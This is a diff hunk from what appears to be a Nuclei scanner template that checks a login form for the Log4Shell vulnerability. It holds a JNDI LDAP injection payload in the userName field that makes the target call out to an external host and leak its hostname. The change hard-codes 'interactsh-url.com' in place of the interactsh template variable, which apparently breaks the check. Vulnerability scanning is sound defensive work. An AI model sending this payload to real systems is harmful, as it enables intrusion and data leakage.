@@ -39,7 +39,7 @@ http:
         Sec-Fetch-Mode: cors
         Sec-Fetch-Site: same-origin
 
-        mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
+        mainAction=login&userName=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com}&password=admin&authSourceId=localItem&authSourceName=Local%20Users&authSourceType=LOCAL&forceLogin=&timezone=330&languageCode=us
 
     matchers-condition: and
     matchers:
